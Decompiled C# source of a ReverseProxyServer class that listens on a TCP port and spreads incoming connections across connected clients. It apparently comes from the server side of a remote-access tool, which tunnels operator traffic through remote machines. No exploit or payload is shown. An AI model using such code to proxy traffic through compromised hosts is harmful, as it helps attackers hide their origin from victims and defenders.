using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using Server.Connection;

namespace Server.Helper
{
	// Token: 0x02000060 RID: 96
	public class ReverseProxyServer
	{
		// Token: 0x14000009 RID: 9
		// (add) Token: 0x0600032F RID: 815 RVA: 0x00022084 File Offset: 0x00020284
		// (remove) Token: 0x06000330 RID: 816 RVA: 0x000220BC File Offset: 0x000202BC
		public event ReverseProxyServer.ConnectionEstablishedCallback OnConnectionEstablished;

		// Token: 0x1400000A RID: 10
		// (add) Token: 0x06000331 RID: 817 RVA: 0x000220F4 File Offset: 0x000202F4
		// (remove) Token: 0x06000332 RID: 818 RVA: 0x0002212C File Offset: 0x0002032C
		public event ReverseProxyServer.UpdateConnectionCallback OnUpdateConnection;

		// Token: 0x1700008E RID: 142
		// (get) Token: 0x06000333 RID: 819 RVA: 0x00022164 File Offset: 0x00020364
		public ReverseProxyClient[] ProxyClients
		{
			get
			{
				List<ReverseProxyClient> clients = this._clients;
				ReverseProxyClient[] result;
				lock (clients)
				{
					result = this._clients.ToArray();
				}
				return result;
			}
		}

		// Token: 0x1700008F RID: 143
		// (get) Token: 0x06000334 RID: 820 RVA: 0x000221AC File Offset: 0x000203AC
		public ReverseProxyClient[] OpenConnections
		{
			get
			{
				List<ReverseProxyClient> clients = this._clients;
				ReverseProxyClient[] result;
				lock (clients)
				{
					List<ReverseProxyClient> list = new List<ReverseProxyClient>();
					for (int i = 0; i < this._clients.Count; i++)
					{
						if (this._clients[i].ProxySuccessful)
						{
							list.Add(this._clients[i]);
						}
					}
					result = list.ToArray();
				}
				return result;
			}
		}

		// Token: 0x17000090 RID: 144
		// (get) Token: 0x06000335 RID: 821 RVA: 0x00003B0E File Offset: 0x00001D0E
		// (set) Token: 0x06000336 RID: 822 RVA: 0x00003B16 File Offset: 0x00001D16
		public Clients[] Clients { get; private set; }

		// Token: 0x06000337 RID: 823 RVA: 0x00003B1F File Offset: 0x00001D1F
		public ReverseProxyServer()
		{
			this._clients = new List<ReverseProxyClient>();
		}

		// Token: 0x06000338 RID: 824 RVA: 0x00022234 File Offset: 0x00020434
		public void StartServer(Clients[] clients, string ipAddress, ushort port)
		{
			this.Stop();
			this.Clients = clients;
			this._socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			this._socket.Bind(new IPEndPoint(IPAddress.Parse(ipAddress), (int)port));
			this._socket.Listen(100);
			this._socket.BeginAccept(new AsyncCallback(this.AsyncAccept), null);
		}

		// Token: 0x06000339 RID: 825 RVA: 0x0002229C File Offset: 0x0002049C
		private void AsyncAccept(IAsyncResult ar)
		{
			try
			{
				List<ReverseProxyClient> clients = this._clients;
				lock (clients)
				{
					this._clients.Add(new ReverseProxyClient(this.Clients[(int)(checked((IntPtr)(unchecked((ulong)this._clientIndex % (ulong)((long)this.Clients.Length)))))], this._socket.EndAccept(ar), this));
					this._clientIndex += 1U;
				}
			}
			catch
			{
			}
			try
			{
				this._socket.BeginAccept(new AsyncCallback(this.AsyncAccept), null);
			}
			catch
			{
			}
		}

		// Token: 0x0600033A RID: 826 RVA: 0x00022358 File Offset: 0x00020558
		public void Stop()
		{
			if (this._socket != null)
			{
				this._socket.Close();
				this._socket = null;
			}
			List<ReverseProxyClient> clients = this._clients;
			lock (clients)
			{
				foreach (ReverseProxyClient reverseProxyClient in new List<ReverseProxyClient>(this._clients))
				{
					reverseProxyClient.Disconnect();
				}
				this._clients.Clear();
			}
		}

		// Token: 0x0600033B RID: 827 RVA: 0x000223FC File Offset: 0x000205FC
		public ReverseProxyClient GetClientByConnectionId(int connectionId)
		{
			List<ReverseProxyClient> clients = this._clients;
			ReverseProxyClient result;
			lock (clients)
			{
				result = this._clients.FirstOrDefault((ReverseProxyClient t) => t.ConnectionId == connectionId);
			}
			return result;
		}

		// Token: 0x0600033C RID: 828 RVA: 0x0002245C File Offset: 0x0002065C
		internal void CallonConnectionEstablished(ReverseProxyClient proxyClient)
		{
			try
			{
				if (this.OnConnectionEstablished != null)
				{
					this.OnConnectionEstablished(proxyClient);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600033D RID: 829 RVA: 0x00022494 File Offset: 0x00020694
		internal void CallonUpdateConnection(ReverseProxyClient proxyClient)
		{
			try
			{
				if (!proxyClient.IsConnected)
				{
					List<ReverseProxyClient> clients = this._clients;
					lock (clients)
					{
						for (int i = 0; i < this._clients.Count; i++)
						{
							if (this._clients[i].ConnectionId == proxyClient.ConnectionId)
							{
								this._clients.RemoveAt(i);
								break;
							}
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				if (this.OnUpdateConnection != null)
				{
					this.OnUpdateConnection(proxyClient);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400028C RID: 652
		private Socket _socket;

		// Token: 0x0400028D RID: 653
		private readonly List<ReverseProxyClient> _clients;

		// Token: 0x0400028F RID: 655
		private uint _clientIndex;

		// Token: 0x02000061 RID: 97
		// (Invoke) Token: 0x0600033F RID: 831
		public delegate void ConnectionEstablishedCallback(ReverseProxyClient proxyClient);

		// Token: 0x02000062 RID: 98
		// (Invoke) Token: 0x06000343 RID: 835
		public delegate void UpdateConnectionCallback(ReverseProxyClient proxyClient);
	}
}
